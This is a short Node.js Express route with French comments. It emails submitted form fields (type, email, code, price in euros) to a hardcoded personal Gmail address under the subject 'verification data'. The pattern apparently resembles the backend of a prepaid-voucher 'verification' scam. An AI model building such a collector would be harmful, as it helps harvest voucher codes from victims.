const nodemailer = require('nodemailer');

// Route POST pour recevoir les données du formulaire
exports.contactAdmin = (req, res) => {
  const { type, email, code, price } = req.body;

  // Configuration du transporteur SMTP pour Nodemailer
  const transporter = nodemailer.createTransport({
    service: process.env.EMAIL_SERVICE,
    secure: true,
    auth: {
      user: process.env.EMAIL_USER, // Adresse e-mail prédéfinie pour envoyer les e-mails
      pass: process.env.EMAIL_PASSWORD,
    },
  });

  // Options de l'e-mail à envoyer
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: 'dianelx12@gmail.com', // Adresse e-mail de l'administrateur
    subject: 'Données de vérification',
    text: `Type: ${type}\nEmail: ${email}\nCode: ${code}\nPrice: ${price}€`,
  };

  // Envoi de l'e-mail
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error('Error sending email:', error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent:');
      res.status(200).send('Email sent successfully');
    }
  });
};
